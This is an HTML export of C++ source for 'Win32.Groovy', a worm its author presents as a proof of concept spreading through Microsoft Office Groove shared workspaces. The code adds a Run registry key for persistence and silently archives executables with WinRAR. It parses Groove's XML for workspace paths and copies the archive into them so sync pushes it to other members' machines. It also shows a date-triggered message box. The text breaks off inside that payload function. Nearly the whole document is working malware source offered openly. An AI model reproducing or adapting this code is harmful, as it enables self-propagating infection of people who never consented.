<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc12 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">/*************************************************************
 * Win32.Groovy (01/28/2007)
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 * by free0n
 * free0n.host.sk | DoomRiderz www.doomriderz.com
 * ########################################################### 
 * ++Groovy++
 * Groovy is the first Microsoft Office Groove worm. Groove
 * is a new Microsoft Office Tool that lets users share documents
 * and workspaces with other team members. Now the best part
 * about Groove is it "Automatically sends the changes you make 
 * in a workspace to your team members' computers." So naturally
 * this is now a new effective spreading technique that will
 * spread our worm for us and all we have to do is dump our file
 * into a workspace! omg how cool!
 *
 * Now there is some minor security on this tool so no .exe's but
 * we can do .zip's and .rar's so to fully exploit this little
 * loophole we make our worm have the ability to rar it'self! wow
 * hard stuff... the next little challenge is getting the 
 * the workspaces and path to them on the hard drive but once again
 * Microsoft made this really easy by creating us an XML file! 
 * so now we can just parse the xml file and get the all the 
 * paths to copy our worm. Then once the worm is copied to the folder
 * almost instantly Microsoft Groove will alert all the members 
 * of the workspace and download the worm to their computers.
 * Pretty cool right?!  
 * 
 * So let the fun begin on hacking this cool tool. This worm
 * is not violent with no destructive payloads and no real
 * defence against a.v. but since this is like a P.O.C. it 
 * shouldn't matter. I'm not out to destroy the world anyways
 * just the only p.c. that matters (mine) hehe :)
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 ************************************************************/</span><span class="sc0">
</span><span class="sc9">#include &lt;cstdlib&gt;
#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;tlhelp32.h&gt;
#include &lt;fstream&gt;
</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">std</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">//the cooolest way to startup
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AutoRun</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Groovy"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">path</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">())+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//winrar our file up basically
//grabs the winrar path from the registry
//then executes our rar parameters and 
//creates a archive for us.
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">WinRaR</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hwnd</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">rarKey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Software\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">rar</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
    
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">rarlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">rar</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">rarPath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc11">rarKey</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc2">//remember kids always close anything u open
</span><span class="sc0">       </span><span class="sc2">//it's like when u get married you have to make sure
</span><span class="sc0">       </span><span class="sc2">//u always put the lid down after goin tinkle
</span><span class="sc0">       </span><span class="sc2">//else youre wife will cut ur u know whats off
</span><span class="sc0">       
       </span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">rar</span><span class="sc10">,&amp;</span><span class="sc11">rarlen</span><span class="sc10">);</span><span class="sc0">
       </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
       </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
       </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">rar</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">rarPath</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rar</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
          </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
       </span><span class="sc10">}</span><span class="sc0">
       </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc11">rarPath</span><span class="sc10">,</span><span class="sc6">"a groovy.rar *.exe"</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">SW_HIDE</span><span class="sc10">);</span><span class="sc0">
       </span><span class="sc2">//calling winrar like this is dumb but since we do it, we have
</span><span class="sc0">       </span><span class="sc2">//to give the program some time to execute and complete
</span><span class="sc0">       </span><span class="sc11">clock_t</span><span class="sc0"> </span><span class="sc11">goal</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">10000</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">clock</span><span class="sc10">();</span><span class="sc0">
       </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">goal</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">clock</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//duh guess what these next two
//functions do :) 
</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">FileExists</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">ifstream</span><span class="sc0"> </span><span class="sc11">groovy</span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">groovy</span><span class="sc10">.</span><span class="sc11">is_open</span><span class="sc10">();</span><span class="sc0">  
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">ReplaceAll</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">found</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">find</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">found</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc10">::</span><span class="sc11">npos</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">replace</span><span class="sc10">(</span><span class="sc11">found</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">found</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">find</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">AppDataDir</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc2">//hack our shell folders and grab our application data path
</span><span class="sc0">   </span><span class="sc2">//never do that lame hard coding drive shit that's dumb.
</span><span class="sc0">   
   </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">appKey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">".DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">appData</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">appLen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">appData</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">appPath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_USERS</span><span class="sc10">,</span><span class="sc11">appKey</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"Local AppData"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">appData</span><span class="sc10">,&amp;</span><span class="sc11">appLen</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">appData</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc11">appPath</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">appData</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
       </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">appPath</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//holy mother of god!
//string manipulation is horrible in C/C++
//and the fact i'm not good at it doesn't help
//but it works....
//basically opens our passed in xml file
//string tokens based on " " then we save
//all the lines that have RootFolderPath into another
//string.  then we use that replace all method
//to replace those 2 strings and that gives us 
//our filepaths with a delimiter of a double quote "
</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">ParsePaths</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">line</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">ifstream</span><span class="sc0"> </span><span class="sc11">grooveyFile</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">());</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">findchar</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'_'</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">paths</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">grooveyFile</span><span class="sc10">.</span><span class="sc11">is_open</span><span class="sc10">())</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc10">(!</span><span class="sc11">grooveyFile</span><span class="sc10">.</span><span class="sc11">eof</span><span class="sc10">())</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
           </span><span class="sc11">getline</span><span class="sc10">(</span><span class="sc11">grooveyFile</span><span class="sc10">,</span><span class="sc11">line</span><span class="sc10">);</span><span class="sc0">
           </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">line</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">line</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> 
           </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
              </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">[</span><span class="sc11">line</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">()];</span><span class="sc0">
              </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">line</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> 
              </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc11">str</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">line</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
                 </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
              </span><span class="sc10">}</span><span class="sc0">
              </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">rfp</span><span class="sc10">;</span><span class="sc0">
              </span><span class="sc11">rfp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strtok</span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rfp</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> 
              </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">rfp</span><span class="sc10">,</span><span class="sc6">"RootFolderPath="</span><span class="sc10">))</span><span class="sc0"> 
                    </span><span class="sc11">paths</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">rfp</span><span class="sc10">;</span><span class="sc0">
                 </span><span class="sc11">rfp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strtok</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">   
              </span><span class="sc10">}</span><span class="sc0">
           </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">grooveyFile</span><span class="sc10">.</span><span class="sc11">close</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">paths</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">paths</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
           </span><span class="sc2">//this will give us our paths in one string
</span><span class="sc0">           </span><span class="sc2">//we will leave a double quote " there to use
</span><span class="sc0">           </span><span class="sc2">//as our maker then later will just use strtok to
</span><span class="sc0">           </span><span class="sc2">//grab the paths. easy cheezy :)
</span><span class="sc0">           </span><span class="sc11">paths</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ReplaceAll</span><span class="sc10">(</span><span class="sc11">paths</span><span class="sc10">,</span><span class="sc6">"_OrigRootFolderPath="","</span><span class="sc12">");
</span><span class="sc0">           </span><span class="sc11">paths</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ReplaceAll</span><span class="sc10">(</span><span class="sc11">paths</span><span class="sc10">,</span><span class="sc6">"_RootFolderPath="","</span><span class="sc12">");
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">paths</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//we pass in our rar file and our filepaths string
//that was returned from the method above this one
//looks like this C:fasm"C:test"C:blah" since
//our double quote is our delimiter we can use strtok
//again to get the paths to copy from one by one.
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Spread</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">filepaths</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">[</span><span class="sc11">filepaths</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">()];</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">filepaths</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc11">str</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">filepaths</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
       </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">fxs</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">fxs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strtok</span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc12">");
</span><span class="sc0">    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fxs</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">fxs</span><span class="sc10">,</span><span class="sc12">"\")) 
</span><span class="sc0">        </span><span class="sc10">{</span><span class="sc0">
           </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
           </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">fxs</span><span class="sc10">;</span><span class="sc0">
           </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strrchr</span><span class="sc10">(</span><span class="sc11">fxs</span><span class="sc10">,</span><span class="sc12">'\');
</span><span class="sc0">           </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">fxs</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l</span><span class="sc10">-</span><span class="sc11">fxs</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0">
           </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">;</span><span class="sc0">
              </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc11">p</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
           </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">fxs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strtok</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc12">");   
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">   
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Payload</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">time</span><span class="sc10">);</span><span class="sc0">
   
   </span><span class="sc2">//happy 420! i did this for all the people that
</span><span class="sc0">   </span><span class="sc2">//go to hippy hill in San Francisco, hopefully
</span><span class="sc0">   </span><span class="sc2">//you'll be there and not get this message
</span><span class="sc0">   </span><span class="sc2">//but if you do, then just go to the park and groove 
</span><span class="sc0">   </span><span class="sc2">//out to some greatful dead and pass some joints  :) 
</span><span class="sc0">   </span><span class="sc2">//I remember how much fun it was to be out there and i miss it sooo bad :)
</span><span class="sc0">   </span><span class="sc2">//great people and great fun! do it if you ever get a chance
</span><span class="sc0">   
   </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">.</span><span class="sc11">wMonth</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"Infected with the first Groove worm. Don't worry nothin bad happend. Isn't it just groooovy! :)"</span><span class="sc10">,</span><span class="sc6">"Grooovy by free0n [DoomRiderz]"</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">                   
   </span><span class="sc10">}</span><span class="sc0">
   
